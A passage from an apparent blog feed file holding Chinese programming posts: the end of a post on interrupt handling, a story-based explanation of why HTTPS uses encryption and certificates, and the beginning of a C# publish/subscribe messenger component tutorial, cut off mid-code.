<li>处理器对中断信号进行判断，若存在未响应的中断，则给产生中断信号的设备发送确认信号，确认信号使得设备取消它的中断信号。</li>
<li>处理器将控制前转移给中断程序中，中断程序从栈中获取之前保存的信息，使得能继续执行 I/O 完成时的后续操作。</li>
<li>处理器将中断程序入口地址载入到程序计数器中，使得处理器能继续执行下一个指令周期。</li>
</ol>
<h1 id="相关文献"><a href="#相关文献" class="headerlink" title="相关文献"></a>相关文献</h1><ol>
<li>《操作系统 - 精髓与设计原理》</li>
<li><a href="https://blog.csdn.net/flydream0/article/details/8589667" target="_blank" rel="noopener">时钟中断是 rt-thread 的线程调度器的驱动力</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 计算机原理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[用故事说透 HTTPS]]></title>
      <url>/2019/12/12/KnowHttpsThroughStory/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://mp.weixin.qq.com/s/MfvUuitrF8MN16nxyZNB8A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/MfvUuitrF8MN16nxyZNB8A</a></p>
</blockquote>
<a id="more"></a>

<p>&emsp;&emsp;故事中的主演：</p>
<figure class="image-box">
                <img src="1.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;小华今年上大一，这是她第一次离开父母，独自一人到北京上学。今天妈妈的生日，想了想要给妈妈一个祝福，便给妈妈发了条消息：</p>
<figure class="image-box">
                <img src="2.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;妈妈收到这条消息非常开心，女儿这么忙还能记得自己的生日，两个人便开始聊了起来。妈妈知道女儿一直省吃俭用，决定给女儿打点钱过去。</p>
<figure class="image-box">
                <img src="3.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;小黑是个黑客，专搞一些“偷鸡摸狗”的事情，他已经监听了这对母女的对话。一直看着她们唠家常，都快睡着了。</p>
<figure class="image-box">
                <img src="4.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;直到看到母女提到钱的事情，立马打起精神，决定搞一笔。然后他截获了小华的消息，替换成自己精心准备的内容给小华的妈妈发过去了。</p>
<figure class="image-box">
                <img src="5.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;小华的妈妈随后就把钱打给了小华，未曾想到母女二人的聊天内容尽在小黑的掌控之中。小黑拿到钱后就逃之夭夭了。</p>
<blockquote>
<p>&emsp;&emsp;HTTP 协议是建立在 TCP 之上的，TCP 是否安全决定了 HTTP 是否安全。HTTP的报文内容并未加密，容易被监听和篡改。小黑就监听了母女二人的聊天内容，并对内容进行了篡改，伪装成女儿进行聊天。所以 HTTP 有以下 3 个问题：</p>
<ol>
<li>内容未加密，容易被监听，都是明文传输；</li>
<li>无法验证内容的完整性，容易被篡改，也就是说不知道消息是不是被修改过；</li>
<li>无法验证对方的身份，我现在聊天的人是谁，可靠吗？</li>
</ol>
</blockquote>
<p>&emsp;&emsp;小华被骗后，心里很难过，把这件事告诉了她的计算机老师王大强。王老师听到被骗的经历，感到非常惊讶，消息为什么会被篡改呢！立马查看了她们使用的聊天软件，原来这个软件直接使用的是 TCP 协议，没有做安全措施。<br>&emsp;&emsp;研究完软件后，大强对小华说：“这款软件有问题，以后别用了，要用具有安全措施的软件，比如使用 TLS/SSL 协议的软件”。<br>&emsp;&emsp;小华说：“什么是 TLS/SSL 呢？”。大强看到小华诚恳的表情，决定把 HTTPS 的原理告诉她，但是想到她可能理解不了，然后决定剖析一下她和妈妈被骗的场景。<br>&emsp;&emsp;既然小华和她妈妈的聊天内容是明文传输的，那直接把内容加密不就完事了吗。小华和她妈妈就约定了一个密码，所有的内容都通过这个密码进行加密和解密。</p>
<figure class="image-box">
                <img src="6.webp" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;这种加密方式称为对称加密，加密解密都是通过同一个密码来操作，所以需要保证密码的安全，一旦泄露，后果很严重。</p>
</blockquote>
<p>&emsp;&emsp;小华立马觉察到事情的不妙，密码如何才能传给她妈妈呢。只能双方见面后来约定一个密码。但是她想到远在美国的爸爸，如果向他要钱的话，需要飞往美国把密码告诉他。这太麻烦了。<br>&emsp;&emsp;王大强老师说：“别急，还有更好的方法”。那就使用两个密钥，一个用来加密（称为私钥），另一个用来解密（称为公钥），使用私钥加密过的内容，只能通过公钥进行解密。私钥只有自己有，公钥可以丢给别人。</p>
<figure class="image-box">
                <img src="7.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;小华和妈妈，只把公钥交给对方就行。小华给妈妈发消息的时候，用妈妈的公钥进行加密，私钥只有妈妈有，也就是说只有妈妈能解密。</p>
<blockquote>
<p>&emsp;&emsp;这种加密方式称为非对称加密，会有二个钥匙，一个钥匙加密过的内容只能通过另一个钥匙进行解密。至于为啥要说<strong>公钥加密私钥解密</strong>，虽然两个钥匙都可以进行加密解密，但是公钥加密私钥解密这种说法不是更好理解吗？公钥被人都知道，私钥只有自己知道。</p>
</blockquote>
<p>&emsp;&emsp;小华想了想觉得还是有点不安全，假如她和妈妈进行交换公钥的时候，被小黑监听了。<br>&emsp;&emsp;小华把自己的公钥 <code>xiaohua_pub</code> 发给妈妈，中途被小黑掉包了，小黑把自己的公钥 <code>xiaohei_pub</code> 发给了小华的妈妈。这样小华妈妈发消息的时候就使用了小黑的公钥进行了加密，小黑获取到消息表可以用自己的私钥进行解密。</p>
<figure class="image-box">
                <img src="8.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;妈妈发送自己的公钥给小华的时候也被小黑掉包了，这时小黑就有了双方的公钥。</p>
<figure class="image-box">
                <img src="9.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;小黑监听到小华要求妈妈打钱的消息，对消息进行了篡改。</p>
<figure class="image-box">
                <img src="10.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;王大强老师听完小华的疑虑，竖起了大拇指，说道：“别急，听我慢慢解释”。<br>&emsp;&emsp;现在的问题是出在交换公钥的时候被小黑调包了，那接下来就需要解决这个问题。如何才能把公钥安全地送到对方手上。<br>&emsp;&emsp;这似乎是永远解不了的问题，毕竟公钥始终是要经过传输的。这似乎是一个鸡生蛋蛋生鸡的问题。后来小华想了想他平时网上购物的时候，以前总是担心怕付款了，商家跑路不给发货，自从有了淘宝这个第三方机构，毕竟阿里家大业大，值得信赖，即使商家跑路了可以找淘宝。<br>&emsp;&emsp;后来就出现了关于公钥的认证机构，这些认证机构很少，但非常权威，它会和电脑、浏览器等厂商达成信任关系，提前把认证机构的公钥安装到系统中，这样就不会涉及到传输的问题了。</p>
<figure class="image-box">
                <img src="11.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在聊天的过程中，小华发现消息发送和接收的时候很慢，后来发现因为是加密算法耗费比较长的时间。小华想了想，使用对称加密的时候，唯一的缺点是交换秘钥比较麻烦，但是速度非常快。那么可以通过非对称加密来传输对称加密的密钥，密钥传输成功后，使用对称加密来加密消息。</p>
<figure class="image-box">
                <img src="12.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;到此，你理解如何保证通信安全了吗？</p>
<blockquote>
<p>&emsp;&emsp;HTTP 属于应用层协议，HTTPS 并不是一个新的协议，它只是比 HTTP 协议多了一层（TLS/SSL）来保证数据传输安全。TLS/SSL也属于协议，它的主要作用是保证数据传输安全。大多数使用的是 OpenSSL 来实现，比如 Node 中的 TLS 就是基于 OpenSSL 实现的。</p>
</blockquote>
<figure class="image-box">
                <img src="13.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;本文以故事的形式介绍了 HTTP 的不安全，保证 HTTPS 安全性的背后支持，包含数字证书、数字签名、对称加密、非对称加密的概念，当然光有理论还不行，需要实践才能更好地理解。大家加油。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[为 WPF, UWP 及 Xamarin 实现一个简单的消息组件]]></title>
      <url>/2019/12/10/ASimpleMessageComponent/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://mp.weixin.qq.com/s/PfFN_U0Yd6G3tZqpr1AwXg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/PfFN_U0Yd6G3tZqpr1AwXg</a></p>
</blockquote>
<a id="more"></a>

<p>本文目录：</p>
<ol>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#介绍">介绍</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#Message-消息">Message - 消息</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#Subscription-订阅">Subscription - 订阅</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#MessengerHub-消息总线">MessageHub - 消息总线</a><ol>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#Subscribe-订阅">Subscribe - 订阅</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#Unsubscribe-取消订阅">Unsubscribe - 取消订阅</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#Publish-发布">Publish - 发布</a></li>
</ol>
</li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#用法">用法</a><ol>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#从NuGet安装">从 NuGet 安装</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#创建-Message-类">创建 Message 类</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#订阅">订阅</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#发布-Message">发布 Message</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#参数">参数</a></li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#取消订阅">取消订阅</a></li>
</ol>
</li>
<li><a href="https://tao-lol.top/2019/12/10/ASimpleMessageComponent/#与-MvvmCross-Messenger-的差异">与 MvvmCross.Messenger 的差异</a></li>
</ol>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>&emsp;&emsp;Sub-Pub 模式是一种常用的设计模式，用来在系统的不同组件中传递消息。发送消息的称为 Publisher，接收消息的称为 Subscriber。双方一般不需要知道对方的存在，由一个代理负责消息的传递。其结构如图所示：<br><img src="640.webp" alt=" "><br>&emsp;&emsp;最初的需求是我需要开发一个实现 Socket 发送/接收的WPF应用程序。首先，我应用 MVVM 模式创建了一个基本的 WPF 应用程序。然后，我创建了另一个项目来完成所有与 Socket 通信有关的工作。接下来，我必须将 Socket 项目集成到 ViewModel 项目中，以操作 Socket 连接。<br>&emsp;&emsp;显然，我们可以为此使用 <code>Event</code>。例如，我们可以有一个名为 <code>SocketServer</code> 的类，该类具有一个事件来接收 Socket 数据包，然后在 <code>ViewModel</code> 层中对其进行订阅。但这意味着我们必须在 <code>ViewModel</code> 层中创建 <code>SocketServer</code> 类的实例，该类将 <code>ViewModel</code> 层与 Socket 项目耦合在一起。我希望创建一个中间件以解耦它们。 这样，发布者和订阅者就不需要知道对方的存在了。<br>&emsp;&emsp;MvvmCross 提供了一个名为 <strong>Messenger</strong> 的插件以在 ViewModel 之间进行通信。但它依赖于某些 MvvmCross 组件，这意味着如果我想在其他项目中使用此插件，则必须引用 MvvmCross。这对我当前的情况而言并不理想，因为实际上，Socket 项目没有必要引用 MvvmCross。因此，我做了一个专注于发布/订阅模式的项目，并删除了对 MvvmCross 的依赖。现在，可以在任何 WPF，UWP 和 Xamarin 项目中重复使用它。我已将其发布到 GitHub 上：<a href="https://github.com/yanxiaodi/CoreMessenger" target="_blank" rel="noopener">https://github.com/yanxiaodi/CoreMessenger</a> ，并发布了 NuGet 包：<a href="https://www.nuget.org/packages/FunCoding.CoreMessenger/" target="_blank" rel="noopener">https://www.nuget.org/packages/FunCoding.CoreMessenger/</a> 。本文仅介绍该组件的实现细节，后面会再写一篇文章介绍如何使用 Azure DevOps 实现 CI/CD。<br>&emsp;&emsp;下面让我们了解一下 Sub-Pub 模式的一种实现方式。  </p>
<h1 id="Message-消息"><a href="#Message-消息" class="headerlink" title="Message - 消息"></a>Message - 消息</h1><p>&emsp;&emsp;Message 是在此系统中表示消息的抽象类：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">Message</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">object</span> Sender &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">Message</span>(<span class="params"><span class="keyword">object</span> sender</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Sender = sender ?? <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="keyword">nameof</span>(sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们需要从该抽象类派生不同消息的实例。它有一个名为 <code>sender</code> 的参数，因此订阅者可以获取发送者的实例。但这并不是强制性的。  </p>
<h1 id="Subscription-订阅"><a href="#Subscription-订阅" class="headerlink" title="Subscription - 订阅"></a>Subscription - 订阅</h1><p>&emsp;&emsp;<code>BaseSubscription</code> 是订阅的基类。代码如下：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">BaseSubscription</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> Guid Id &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> SubscriptionPriority Priority &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Tag &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Task&lt;<span class="keyword">bool</span>&gt; <span class="title">Invoke</span>(<span class="params"><span class="keyword">object</span> message</span>)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">BaseSubscription</span>(<span class="params">SubscriptionPriority priority, <span class="keyword">string</span> tag</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Id = Guid.NewGuid();</span><br><span class="line">        Priority = priority;</span><br><span class="line">         Tag = tag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;它有一个 <code>Id</code> 属性和一个 <code>tag</code> 属性，因此您可以放置一些标签来区分或分组订阅实例。<code>Priority</code> 属性是一个枚举类型，用于指示订阅的优先级，因此将按预期顺序调用订阅。订阅有两种类型，一是强引用订阅 <code>StrongSubscription</code>：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class StrongSubscription&lt;TMessage&gt; : BaseSubscription where TMessage : Message</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> Action&lt;TMessage&gt; _action;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StrongSubscription</span>(<span class="params">Action&lt;TMessage&gt; action,</span></span></span><br><span class="line"><span class="function"><span class="params">        SubscriptionPriority priority, <span class="keyword">string</span> tag</span>): <span class="title">base</span>(<span class="params">priority, tag</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _action = action;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">async</span> Task&lt;<span class="keyword">bool</span>&gt; <span class="title">Invoke</span>(<span class="params"><span class="keyword">object</span> message</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> typedMessage = message <span class="keyword">as</span> TMessage;</span><br><span class="line">        <span class="keyword">if</span> (typedMessage == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">$"Unexpected message <span class="subst">&#123;message.ToString()&#125;</span>"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">await</span> Task.Run(() =&gt; _action?.Invoke(typedMessage));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;它继承了 <code>BaseSubscription</code> 并覆盖了 <code>Invoke()</code> 方法。基本上，它具有一个名为 <code>_action</code> 的字段，该字段在创建实例时定义。当我们发布消息时，订阅将调用 <code>Invoke()</code> 方法来执行该 <code>_action</code> 。我们使用 <code>Task</code> 来包装动作，以便可以利用异步操作的优势。<br>&emsp;&emsp;这是名为 <code>WeakSubscription</code> 的另一种订阅：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class WeakSubscription&lt;TMessage&gt; : BaseSubscription where TMessage : Message</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> WeakReference&lt;Action&lt;TMessage&gt;&gt; _weakReference;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WeakSubscription</span>(<span class="params">Action&lt;TMessage&gt; action,</span></span></span><br><span class="line"><span class="function"><span class="params">        SubscriptionPriority priority, <span class="keyword">string</span> tag</span>) : <span class="title">base</span>(<span class="params">priority, tag</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _weakReference = <span class="keyword">new</span> WeakReference&lt;Action&lt;TMessage&gt;&gt;(action);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">async</span> Task&lt;<span class="keyword">bool</span>&gt; <span class="title">Invoke</span>(<span class="params"><span class="keyword">object</span> message</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> typedMessage = message <span class="keyword">as</span> TMessage;</span><br><span class="line">        <span class="keyword">if</span> (typedMessage == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">$"Unexpected message <span class="subst">&#123;message.ToString()&#125;</span>"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Action&lt;TMessage&gt; action;</span><br><span class="line">        <span class="keyword">if</span> (!_weakReference.TryGetTarget(<span class="keyword">out</span> action))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">await</span> Task.Run(() =&gt; action?.Invoke(typedMessage));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;它与强引用订阅的区别在于 action 存储在 <code>WeakReference</code> 字段中。您可以在这里了解更多信息： <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.weakreference-1" target="_blank" rel="noopener">WeakReference 类</a>。它用于表示类型化的弱引用，该弱引用引用一个对象，同时仍允许该对象被垃圾回收回收。在使用它之前，我们需要使用 <code>TryGetTarget(T)</code> 方法检查目标是否已由 GC 收集。如果此方法返回 false，则表示该引用已被 GC 收集。<br>&emsp;&emsp;如果使用 <code>StrongSubscription</code>，Messenger 将保留对回调方法的强引用，并且 Garbage Collection 将不会破坏订阅。在这种情况下，您需要明确取消订阅，以避免内存泄漏。否则，可以使用 <code>WeakSubscription</code>，当对象超出范围时，会自动删除订阅。  </p>
<h1 id="MessengerHub-消息总线"><a href="#MessengerHub-消息总线" class="headerlink" title="MessengerHub - 消息总线"></a>MessengerHub - 消息总线</h1><p>&emsp;&emsp;<code>MessengerHub</code> 是整个应用程序域中的一个单例实例。我们不需要使用依赖注入来创建实例，因为它的目的很明确，我们只有一个实例。这是实现单例模式的简单方法：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MessengerHub</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> Lazy&lt;MessengerHub&gt; lazy = <span class="keyword">new</span> Lazy&lt;MessengerHub&gt;(() =&gt; <span class="keyword">new</span> MessengerHub());</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">MessengerHub</span>(<span class="params"></span>)</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> MessengerHub Instance</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">get</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> lazy.Value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.weakreference-1" target="_blank" rel="noopener">WeakReference 类</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.lazy-1" target="_blank" rel="noopener">Lazy&#60;T&#62; 类</a><br><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.collections.concurrent.concurrentdictionary-2" target="_blank" rel="noopener">ConcurrentDictionary&#60;TKey,TValue&#62; 类</a></p>
</blockquote>
<p>&emsp;&emsp;<code>MessengerHub</code> 在其内部维护一个 <code>ConcurrentDictionary</code> 来管理订阅的实例，如下所示：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">readonly</span> ConcurrentDictionary&lt;Type, ConcurrentDictionary&lt;Guid, BaseSubscription&gt;&gt; _subscriptions =</span><br><span class="line">            <span class="keyword">new</span> ConcurrentDictionary&lt;Type, ConcurrentDictionary&lt;Guid, BaseSubscription&gt;&gt;();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;该 <code>ConcurrentDictionary</code> 的 Key 是 <code>Message</code> 的类型，Value 是一个 <code>ConcurrentDictionary</code>，其中包含该特定 <code>Message</code> 的一组订阅。显然，一种类型可能具有多个订阅。  </p>
<h2 id="Subscribe-订阅"><a href="#Subscribe-订阅" class="headerlink" title="Subscribe - 订阅"></a>Subscribe - 订阅</h2><p>&emsp;&emsp;<code>MessageHub</code> 公开了几种重要的方法来订阅/取消订阅/发布消息。<br>&emsp;&emsp;<code>Subscribe()</code> 方法如下所示：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SubscriptionToken Subscribe&lt;TMessage&gt;(Action&lt;TMessage&gt; action,</span><br><span class="line">    ReferenceType referenceType = ReferenceType.Weak,</span><br><span class="line">    SubscriptionPriority priority = SubscriptionPriority.Normal, <span class="keyword">string</span> tag = <span class="literal">null</span>) <span class="keyword">where</span> TMessage : Message</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (action == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="keyword">nameof</span>(action));</span><br><span class="line">    &#125;</span><br><span class="line">    BaseSubscription subscription = BuildSubscription(action, referenceType, priority, tag);</span><br><span class="line">    <span class="keyword">return</span> SubscribeInternal(action, subscription);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> SubscriptionToken SubscribeInternal&lt;TMessage&gt;(Action&lt;TMessage&gt; action, BaseSubscription subscription)</span><br><span class="line">    <span class="keyword">where</span> TMessage : Message</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!_subscriptions.TryGetValue(<span class="keyword">typeof</span>(TMessage), <span class="keyword">out</span> <span class="keyword">var</span> messageSubscriptions))</span><br><span class="line">    &#123;</span><br><span class="line">        messageSubscriptions = <span class="keyword">new</span> ConcurrentDictionary&lt;Guid, BaseSubscription&gt;();</span><br><span class="line">        _subscriptions[<span class="keyword">typeof</span>(TMessage)] = messageSubscriptions;</span><br><span class="line">    &#125;</span><br><span class="line">    messageSubscriptions[subscription.Id] = subscription;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> SubscriptionToken(subscription.Id, <span class="keyword">async</span> () =&gt; <span class="keyword">await</span> UnsubscribeInternal&lt;TMessage&gt;(subscription.Id), action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当我们订阅消息时，会创建 <code>Subscription</code> 的实例并将其添加到字典中。根据您的选择，它可能是强引用或者弱引用。然后它将创建一个 <code>SubscriptionToken</code>，这是一个实现 <code>IDisposable</code> 接口来管理订阅的类：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">SubscriptionToken</span> : <span class="title">IDisposable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> Guid Id &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> Action _disposeMe;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="keyword">object</span> _dependentObject;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SubscriptionToken</span>(<span class="params">Guid id, Action disposeMe, <span class="keyword">object</span> dependentObject</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Id = id;</span><br><span class="line">        _disposeMe = disposeMe;</span><br><span class="line">        _dependentObject = dependentObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        Dispose(<span class="literal">true</span>);</span><br><span class="line">        GC.SuppressFinalize(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span 